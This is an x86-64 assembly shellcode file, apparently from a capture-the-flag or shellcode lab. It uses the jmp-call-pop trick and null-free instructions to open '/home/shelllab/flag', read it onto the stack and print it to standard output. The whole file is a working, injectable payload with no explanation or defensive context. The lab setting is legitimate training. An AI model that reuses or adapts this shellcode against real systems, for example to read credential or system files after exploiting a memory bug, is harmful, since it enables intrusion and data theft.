[global _start]
  
_start:
  jmp ed

st:
  ; open(const char *filename, int flags, int mode);
  pop rdi
  xor rax, rax
  add al, 2
  xor rsi, rsi
  xor rdx, rdx
  syscall

  ; read(int fd, const char *buf, size_t count);
  mov rdi, rax  ; fd is in rax
  xor rax, rax
  sub rsp, 50  ; allocate a buffer on the stack
  mov rsi, rsp
  xor rdx, rdx
  add dl, 50
  syscall

  ; write(int fd, const char *buf, size_t count);
  mov rdx, rax
  xor rax, rax
  add al, 1
  xor rdi, rdi
  inc rdi
  syscall
  ret
  nop

ed:
  call st
  db "/home/shelllab/flag", 0
